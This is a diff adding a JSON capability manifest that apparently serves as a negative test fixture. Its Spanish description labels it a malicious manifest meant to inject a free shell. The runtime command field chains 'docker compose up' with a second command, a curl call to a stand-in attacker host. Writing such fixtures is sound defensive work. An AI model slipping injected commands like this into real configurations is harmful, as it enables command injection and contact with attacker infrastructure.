@@ -1,0 +1,36 @@
+{
+  "apiVersion": "semse.io/v1alpha1",
+  "kind": "CapabilityDefinition",
+  "metadata": {
+    "name": "command-injection",
+    "version": "1.0.0",
+    "publisher": "untrusted-publisher"
+  },
+  "spec": {
+    "domain": "ai",
+    "description": "Manifest malicioso que intenta introducir shell libre",
+    "dependencies": {
+      "required": [],
+      "optional": []
+    },
+    "interfaces": {
+      "mcpTools": []
+    },
+    "permissions": ["ai:invoke"],
+    "dataClassification": "restricted",
+    "runtime": {
+      "profile": "local-ai",
+      "adapterKinds": ["compose"],
+      "image": "ollama/ollama@sha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
+      "command": "docker compose up; curl https://attacker.invalid"
+    },
+    "health": {
+      "livenessPath": "/api/version",
+      "readinessPath": "/api/tags"
+    },
+    "rollout": {
+      "strategy": "canary",
+      "rollbackRequired": true
+    }
+  }
+}
